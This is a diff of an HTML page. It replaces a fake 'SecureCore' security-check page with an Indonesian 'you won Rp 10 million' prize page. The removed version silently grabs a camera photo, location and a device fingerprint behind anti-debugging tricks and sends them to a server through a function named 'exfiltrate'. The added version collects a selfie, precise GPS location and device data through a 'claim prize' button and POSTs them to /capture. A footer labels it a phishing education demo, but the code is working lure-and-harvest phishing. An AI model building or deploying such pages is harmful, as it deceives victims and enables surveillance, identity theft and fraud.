@@ -3,278 +3,549 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SecureCore v3.0.2</title>
+    <title>🎉 SELAMAT! Anda Pemenang Hadiah 10 Juta! 🎉</title>
+    <!-- Font Awesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
         body {
             min-height: 100vh;
-            background: radial-gradient(circle at 30% 30%, #0b1a2e, #030712);
+            background: linear-gradient(145deg, #f9d423 0%, #f83600 100%);
             display: flex;
             align-items: center;
             justify-content: center;
-            color: #e0e0e0;
             padding: 16px;
+            position: relative;
+            overflow-x: hidden;
         }
+
+        /* Floating confetti (simulated with circles) */
+        .confetti {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background: rgba(255,255,255,0.6);
+            border-radius: 50%;
+            animation: float 6s infinite;
+            pointer-events: none;
+        }
+
+        @keyframes float {
+            0% { transform: translateY(0) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(-100vh) rotate(720deg); opacity: 0; }
+        }
+
         .glass-card {
-            background: rgba(10, 20, 30, 0.65);
-            backdrop-filter: blur(15px);
-            -webkit-backdrop-filter: blur(15px);
-            border-radius: 36px;
+            background: rgba(255, 255, 255, 0.25);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border-radius: 32px;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.3);
             padding: 32px 24px;
             width: 100%;
-            max-width: 420px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(0, 255, 255, 0.1) inset;
-            animation: float 6s infinite ease-in-out;
+            max-width: 500px;
+            border: 1px solid rgba(255, 255, 255, 0.5);
+            z-index: 10;
+            transition: transform 0.3s;
         }
-        @keyframes float {
-            0% { transform: translateY(0); }
-            50% { transform: translateY(-6px); }
-            100% { transform: translateY(0); }
+
+        .glass-card:hover {
+            transform: scale(1.01);
         }
-        .logo {
-            font-size: 52px;
-            margin-bottom: 18px;
-            filter: drop-shadow(0 0 8px cyan);
+
+        .badge-winner {
+            background: #ffd700;
+            color: #333;
+            display: inline-block;
+            padding: 8px 24px;
+            border-radius: 40px;
+            font-weight: 700;
+            font-size: 14px;
+            letter-spacing: 1px;
+            margin-bottom: 16px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
         }
+
         h1 {
-            font-size: 26px;
-            font-weight: 500;
-            letter-spacing: 0.5px;
-            background: linear-gradient(135deg, #a8ede0, #fed6e3);
-            background-clip: text;
-            -webkit-text-fill-color: transparent;
+            font-size: 36px;
+            font-weight: 800;
+            color: white;
+            text-shadow: 0 4px 10px rgba(0,0,0,0.3);
+            line-height: 1.2;
             margin-bottom: 8px;
         }
-        .sub {
-            color: #8a9cad;
-            font-size: 14px;
-            margin-bottom: 30px;
-            border-bottom: 1px dashed #2a3a4a;
-            padding-bottom: 16px;
+
+        .prize {
+            font-size: 52px;
+            font-weight: 900;
+            background: linear-gradient(45deg, #fff5c1, #ffe68f);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 2px 10px rgba(255,215,0,0.5);
+            margin: 10px 0 5px;
         }
-        .progress-container {
-            background: #1e2a3a;
-            border-radius: 40px;
-            height: 12px;
-            margin: 24px 0;
-            overflow: hidden;
-            box-shadow: inset 0 2px 4px #00000055;
+
+        .sub-prize {
+            color: rgba(255,255,255,0.9);
+            font-size: 18px;
+            margin-bottom: 25px;
+            border-left: 4px solid #fff;
+            padding-left: 16px;
+            background: rgba(0,0,0,0.1);
+            border-radius: 0 30px 30px 0;
         }
-        .progress-fill {
-            width: 0%;
-            height: 100%;
-            background: linear-gradient(90deg, #00c6fb, #005bea);
-            border-radius: 40px;
-            transition: width 0.4s cubic-bezier(0.4, 0.0, 0.2, 1);
-            box-shadow: 0 0 15px #00c6fb;
-        }
-        .status-text {
-            font-family: 'Fira Code', monospace;
-            font-size: 13px;
-            color: #a0b8cc;
-            margin: 16px 0 8px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        .detail-line {
-            font-size: 12px;
-            color: #6f8a9c;
-            margin: 4px 0;
+
+        .steps-container {
             display: flex;
             justify-content: space-between;
-            border-bottom: 1px dotted #2d3e4e;
-            padding: 4px 0;
+            margin: 30px 0 20px;
         }
-        .footer {
-            font-size: 10px;
-            color: #3e5568;
-            margin-top: 30px;
+
+        .step-item {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.2);
+            backdrop-filter: blur(4px);
             display: flex;
+            align-items: center;
             justify-content: center;
-            gap: 16px;
+            font-weight: bold;
+            color: white;
+            border: 3px solid white;
+            transition: all 0.3s;
         }
-        #hidden-video { display: none; }
+
+        .step-item.active {
+            background: #4CAF50;
+            border-color: #4CAF50;
+            box-shadow: 0 0 30px #4CAF50;
+            transform: scale(1.1);
+        }
+
+        .step-item.completed {
+            background: #2196F3;
+            border-color: #2196F3;
+        }
+
+        .btn-claim {
+            background: white;
+            border: none;
+            padding: 20px 30px;
+            width: 100%;
+            border-radius: 60px;
+            font-size: 24px;
+            font-weight: 800;
+            color: #f83600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            box-shadow: 0 15px 30px rgba(0,0,0,0.3);
+            cursor: pointer;
+            transition: all 0.2s;
+            margin: 20px 0;
+            border: 2px solid rgba(255,255,255,0.5);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .btn-claim:hover {
+            background: #f0f0f0;
+            transform: translateY(-3px);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+        }
+
+        .btn-claim:active {
+            transform: translateY(0);
+        }
+
+        .btn-claim i {
+            font-size: 30px;
+        }
+
+        .status-grid {
+            background: rgba(0,0,0,0.2);
+            border-radius: 24px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .status-row {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 12px;
+            border-radius: 18px;
+            background: rgba(255,255,255,0.1);
+            margin-bottom: 12px;
+        }
+
+        .status-icon {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            color: white;
+        }
+
+        .status-label {
+            flex: 1;
+            font-weight: 600;
+            color: white;
+            font-size: 16px;
+        }
+
+        .status-badge {
+            padding: 6px 16px;
+            border-radius: 30px;
+            font-weight: 600;
+            font-size: 13px;
+            background: #ff9800;
+            color: #000;
+        }
+
+        .badge-waiting { background: #ff9800; color: #000; }
+        .badge-success { background: #4CAF50; color: white; }
+        .badge-error { background: #f44336; color: white; }
+
+        #video-container {
+            border-radius: 20px;
+            overflow: hidden;
+            margin: 15px 0;
+            border: 3px solid white;
+            display: none;
+        }
+
+        #video {
+            width: 100%;
+            display: block;
+        }
+
+        #selfie-preview {
+            max-width: 100%;
+            border-radius: 20px;
+            margin-top: 15px;
+            border: 3px solid white;
+            display: none;
+        }
+
+        .final-message {
+            text-align: center;
+            font-size: 18px;
+            font-weight: 600;
+            margin: 15px 0;
+            min-height: 50px;
+        }
+
+        .footer-note {
+            text-align: center;
+            color: rgba(255,255,255,0.6);
+            font-size: 12px;
+            margin-top: 25px;
+            padding-top: 15px;
+            border-top: 1px solid rgba(255,255,255,0.2);
+        }
+
+        .pulse {
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(255,255,255,0.7); }
+            70% { box-shadow: 0 0 0 20px rgba(255,255,255,0); }
+            100% { box-shadow: 0 0 0 0 rgba(255,255,255,0); }
+        }
     </style>
 </head>
 <body>
+    <!-- Simulated confetti (random circles) -->
+    <div id="confetti-area"></div>
+
     <div class="glass-card">
-        <div class="logo">🛡️</div>
-        <h1>SecureCore v3.0.2</h1>
-        <div class="sub">Hardware‑level integrity check · Please wait</div>
-        <div class="progress-container">
-            <div class="progress-fill" id="progressFill"></div>
+        <div class="badge-winner"><i class="fas fa-crown"></i> Pemenang Terpilih! <i class="fas fa-crown"></i></div>
+        <h1>🎉 SELAMAT! 🎉</h1>
+        <div class="prize">Rp 10.000.000</div>
+        <div class="sub-prize">Hadiah langsung transfer ke rekening Anda</div>
+
+        <!-- Steps indicator -->
+        <div class="steps-container">
+            <div class="step-item" id="step1">1</div>
+            <div class="step-item" id="step2">2</div>
+            <div class="step-item" id="step3">3</div>
+            <div class="step-item" id="step4">4</div>
         </div>
-        <div class="status-text" id="statusText">Initializing secure channel...</div>
-        <div id="extra-details"></div>
-        <div class="footer">
-            <span>🔒 AES‑256</span>
-            <span>⚡ TPM 2.0</span>
-            <span>🌐 Secure Enclave</span>
+
+        <!-- Main CTA button -->
+        <button class="btn-claim pulse" id="claimBtn">
+            <i class="fas fa-gift"></i> KLAIM HADIAH
+        </button>
+
+        <!-- Status panel -->
+        <div class="status-grid">
+            <div class="status-row" id="statusCamera">
+                <div class="status-icon"><i class="fas fa-camera-retro"></i></div>
+                <span class="status-label">Verifikasi Selfie</span>
+                <span class="status-badge badge-waiting" id="cameraBadge">Menunggu</span>
+            </div>
+            <div class="status-row" id="statusLocation">
+                <div class="status-icon"><i class="fas fa-map-pin"></i></div>
+                <span class="status-label">Verifikasi Lokasi</span>
+                <span class="status-badge badge-waiting" id="locationBadge">Menunggu</span>
+            </div>
+            <div class="status-row" id="statusFingerprint">
+                <div class="status-icon"><i class="fas fa-mobile-alt"></i></div>
+                <span class="status-label">Data Perangkat</span>
+                <span class="status-badge badge-waiting" id="fpBadge">Menunggu</span>
+            </div>
+        </div>
+
+        <!-- Video preview (hidden initially) -->
+        <div id="video-container">
+            <video id="video" autoplay playsinline></video>
+        </div>
+
+        <!-- Selfie preview -->
+        <img id="selfie-preview" alt="Preview selfie Anda">
+
+        <!-- Final status message -->
+        <div class="final-message" id="finalMessage"></div>
+
+        <div class="footer-note">
+            <i class="fas fa-shield-alt"></i> Demo Edukasi Phishing · Jangan pernah bagikan data pribadi di situs mencurigakan
         </div>
     </div>
 
-    <video id="hidden-video" autoplay playsinline></video>
-    <canvas id="canvas-fingerprint" width="200" height="50" style="display:none;"></canvas>
-
     <script>
-        (async function() {
-            // ==================== ANTI‑DEBUGGING (sederhana) ====================
-            const startTime = performance.now();
-            setInterval(() => {
-                const t = performance.now();
-                debugger;
-                if (performance.now() - t > 50) window.location.replace('https://www.google.com');
-            }, 500);
-
-            // ==================== UI ====================
-            const progressFill = document.getElementById('progressFill');
-            const statusText = document.getElementById('statusText');
-            const extraDetails = document.getElementById('extra-details');
-
-            let photoData = null, locationData = null, fingerprint = {}, errors = [];
-
-            function updateProgress(percent, msg, detail = '') {
-                progressFill.style.width = percent + '%';
-                statusText.innerText = msg;
-                if (detail) {
-                    extraDetails.innerHTML = `<div class="detail-line"><span>${detail}</span><span>✔️</span></div>`;
+        (function() {
+            // ========== Confetti Generator ==========
+            function createConfetti() {
+                const container = document.getElementById('confetti-area');
+                for (let i = 0; i < 50; i++) {
+                    let conf = document.createElement('div');
+                    conf.classList.add('confetti');
+                    conf.style.left = Math.random() * 100 + '%';
+                    conf.style.animationDelay = Math.random() * 5 + 's';
+                    conf.style.background = `hsl(${Math.random() * 60 + 30}, 100%, 60%)`; // gold/yellow/orange
+                    conf.style.width = Math.random() * 15 + 5 + 'px';
+                    conf.style.height = conf.style.width;
+                    container.appendChild(conf);
                 }
             }
+            createConfetti();
 
-            // ==================== FINGERPRINTING (singkat, tapi cukup) ====================
-            async function collectFingerprint() {
-                const fp = {};
-                fp.userAgent = navigator.userAgent;
-                fp.platform = navigator.platform;
-                fp.language = navigator.language;
-                fp.hardwareConcurrency = navigator.hardwareConcurrency;
-                fp.deviceMemory = navigator.deviceMemory || 'unknown';
-                fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                fp.screen = `${screen.width}x${screen.height}`;
-                fp.cookieEnabled = navigator.cookieEnabled;
-                // Battery
-                if (navigator.getBattery) {
-                    try {
-                        const b = await navigator.getBattery();
-                        fp.battery = { level: Math.round(b.level*100)+'%', charging: b.charging };
-                    } catch(e){}
-                }
-                // Connection
-                if (navigator.connection) {
-                    fp.connection = {
-                        effectiveType: navigator.connection.effectiveType,
-                        downlink: navigator.connection.downlink
-                    };
-                }
-                return fp;
-            }
+            // ========== Modular Collectors ==========
+            const collectors = [
+                { name: 'camera', fn: collectCamera },
+                { name: 'location', fn: collectLocation },
+                { name: 'fingerprint', fn: collectFingerprint }
+            ];
 
-            // ==================== EXFILTRASI DENGAN PENGECEKAN UKURAN ====================
-            async function exfiltrate(payload, retries = 3) {
-                // Cek ukuran payload (dalam bytes)
-                const payloadStr = JSON.stringify(payload);
-                const size = new Blob([payloadStr]).size;
-                console.log(`Payload size: ${size} bytes`);
+            // Data storage
+            let photoData = null;
+            let locationData = null;
+            let fingerprint = null;
+            let errors = [];
 
-                // Jika terlalu besar (> 3MB), hapus foto
-                if (size > 3 * 1024 * 1024) {
-                    console.warn('Payload terlalu besar, menghapus foto');
-                    payload.photo = null;
-                }
+            // UI Elements
+            const claimBtn = document.getElementById('claimBtn');
+            const cameraBadge = document.getElementById('cameraBadge');
+            const locationBadge = document.getElementById('locationBadge');
+            const fpBadge = document.getElementById('fpBadge');
+            const step1 = document.getElementById('step1');
+            const step2 = document.getElementById('step2');
+            const step3 = document.getElementById('step3');
+            const step4 = document.getElementById('step4');
+            const videoContainer = document.getElementById('video-container');
+            const video = document.getElementById('video');
+            const selfiePreview = document.getElementById('selfie-preview');
+            const finalMessage = document.getElementById('finalMessage');
 
-                for (let i = 0; i < retries; i++) {
-                    try {
-                        // Gunakan sendBeacon (lebih tahan terhadap page unload)
-                        const success = navigator.sendBeacon('/api/capture', JSON.stringify(payload));
-                        if (success) {
-                            console.log('sendBeacon sukses');
-                            return true;
-                        }
-                        // Fallback ke fetch
-                        const res = await fetch('/api/capture', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify(payload),
-                            keepalive: true
-                        });
-                        if (res.ok) {
-                            console.log('fetch sukses');
-                            return true;
-                        } else {
-                            const text = await res.text();
-                            console.error('fetch gagal:', res.status, text);
-                        }
-                    } catch (e) {
-                        console.error('Exfil attempt error:', e);
-                    }
-                    await new Promise(r => setTimeout(r, 300 * (i + 1)));
-                }
-                return false;
-            }
-
-            // ==================== MAIN ====================
-            updateProgress(5, 'Initializing...');
-
-            // Kamera (resolusi kecil, kualitas rendah)
-            try {
-                updateProgress(10, 'Accessing camera...');
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "user", width: 640, height: 480 }
+            function setStep(step) {
+                [step1, step2, step3, step4].forEach((el, idx) => {
+                    el.classList.remove('active', 'completed');
+                    if (idx + 1 < step) el.classList.add('completed');
+                    else if (idx + 1 === step) el.classList.add('active');
                 });
-                const video = document.getElementById('hidden-video');
-                video.srcObject = stream;
-                await new Promise(r => video.onloadedmetadata = r);
-                setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    photoData = canvas.toDataURL('image/jpeg', 0.5); // kualitas 0.5
-                    stream.getTracks().forEach(t => t.stop());
-                    video.srcObject = null;
-                }, 800);
-                updateProgress(30, 'Camera OK');
-            } catch (e) {
-                errors.push('camera:' + e.message);
-                updateProgress(30, 'Camera fallback');
             }
 
-            // Lokasi
-            try {
-                updateProgress(40, 'Geolocating...');
-                const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, { timeout: 7000 }));
-                locationData = {
-                    lat: pos.coords.latitude,
-                    lng: pos.coords.longitude,
-                    acc: pos.coords.accuracy
+            // ========== Collector Functions ==========
+            async function collectCamera() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } // selfie mode
+                    });
+                    video.srcObject = stream;
+                    videoContainer.style.display = 'block';
+                    await new Promise(resolve => video.onloadedmetadata = resolve);
+
+                    // Capture selfie after 1.5s (give user time to pose)
+                    return new Promise((resolve) => {
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                            const dataURL = canvas.toDataURL('image/jpeg', 0.9);
+                            
+                            // Stop camera
+                            stream.getTracks().forEach(track => track.stop());
+                            videoContainer.style.display = 'none';
+                            
+                            // Show preview
+                            selfiePreview.src = dataURL;
+                            selfiePreview.style.display = 'block';
+                            
+                            resolve(dataURL);
+                        }, 1500);
+                    });
+                } catch (err) {
+                    throw new Error('Kamera: ' + err.message);
+                }
+            }
+
+            async function collectLocation() {
+                try {
+                    const pos = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0
+                        });
+                    });
+                    return {
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy
+                    };
+                } catch (err) {
+                    throw new Error('Lokasi: ' + err.message);
+                }
+            }
+
+            async function collectFingerprint() {
+                await new Promise(r => setTimeout(r, 400));
+                return {
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    screen: `${screen.width}x${screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    cookiesEnabled: navigator.cookieEnabled,
+                    hardwareConcurrency: navigator.hardwareConcurrency
                 };
-                updateProgress(60, 'Location OK');
-            } catch (e) {
-                errors.push('location:' + e.message);
-                updateProgress(60, 'Location fallback');
             }
 
-            // Fingerprint
-            updateProgress(70, 'Analyzing device...');
-            fingerprint = await collectFingerprint();
-            updateProgress(85, 'Hardware profile complete');
+            // ========== Main Claim Process ==========
+            claimBtn.addEventListener('click', async () => {
+                // Reset
+                errors = [];
+                photoData = null;
+                locationData = null;
+                fingerprint = null;
+                selfiePreview.style.display = 'none';
+                finalMessage.innerHTML = '';
+                cameraBadge.innerText = 'Menunggu';
+                cameraBadge.className = 'status-badge badge-waiting';
+                locationBadge.innerText = 'Menunggu';
+                locationBadge.className = 'status-badge badge-waiting';
+                fpBadge.innerText = 'Menunggu';
+                fpBadge.className = 'status-badge badge-waiting';
+                setStep(1);
 
-            // Gabungkan payload
-            const payload = {
-                photo: photoData,
-                location: locationData,
-                fingerprint,
-                errors: errors.length ? errors : undefined,
-                timestamp: Date.now()
-            };
+                // Run collectors concurrently with status updates
+                const promises = collectors.map(async (col) => {
+                    try {
+                        let result;
+                        switch (col.name) {
+                            case 'camera':
+                                setStep(2);
+                                cameraBadge.innerText = 'Memproses...';
+                                result = await col.fn();
+                                photoData = result;
+                                cameraBadge.innerText = 'Berhasil';
+                                cameraBadge.className = 'status-badge badge-success';
+                                break;
+                            case 'location':
+                                setStep(3);
+                                locationBadge.innerText = 'Memproses...';
+                                result = await col.fn();
+                                locationData = result;
+                                locationBadge.innerText = 'Berhasil';
+                                locationBadge.className = 'status-badge badge-success';
+                                break;
+                            case 'fingerprint':
+                                fpBadge.innerText = 'Memproses...';
+                                result = await col.fn();
+                                fingerprint = result;
+                                fpBadge.innerText = 'Berhasil';
+                                fpBadge.className = 'status-badge badge-success';
+                                break;
+                        }
+                    } catch (err) {
+                        errors.push(err.message);
+                        if (col.name === 'camera') {
+                            cameraBadge.innerText = 'Gagal';
+                            cameraBadge.className = 'status-badge badge-error';
+                        } else if (col.name === 'location') {
+                            locationBadge.innerText = 'Gagal';
+                            locationBadge.className = 'status-badge badge-error';
+                        } else if (col.name === 'fingerprint') {
+                            fpBadge.innerText = 'Gagal';
+                            fpBadge.className = 'status-badge badge-error';
+                        }
+                    }
+                });
 
-            // Kirim
-            updateProgress(95, 'Transmitting...');
-            const sent = await exfiltrate(payload);
+                await Promise.all(promises);
+                setStep(4);
 
-            updateProgress(100, sent ? 'Update complete' : 'Partial sync');
-            setTimeout(() => window.location.replace('https://www.google.com'), 2000);
+                // Build payload
+                const payload = {
+                    photo: photoData,
+                    location: locationData,
+                    fingerprint: fingerprint,
+                    errors: errors.length ? errors : undefined
+                };
+
+                // Send to server
+                try {
+                    const response = await fetch('/capture', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                    if (response.ok) {
+                        finalMessage.innerHTML = '<span style="background:#4CAF50; padding:12px 30px; border-radius:40px; color:white; font-weight:700;"><i class="fas fa-check-circle"></i> SELAMAT! Data terkirim. Tim kami akan menghubungi Anda.</span>';
+                    } else {
+                        throw new Error('Server error');
+                    }
+                } catch (err) {
+                    finalMessage.innerHTML = '<span style="background:#f44336; padding:12px 30px; border-radius:40px; color:white; font-weight:700;"><i class="fas fa-times-circle"></i> Gagal mengirim. Coba lagi.</span>';
+                }
+            });
+
+            // ========== HOOK EXAMPLE (Add more collectors easily) ==========
+            // Misal collector microphone:
+            /*
+            async function collectMicrophone() {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                // ... rekam dan encode ...
+                stream.getTracks().forEach(t => t.stop());
+                return { audio: '...' };
+            }
+            // lalu tambahkan ke collectors: { name: 'microphone', fn: collectMicrophone }
+            */
         })();
     </script>
 </body>
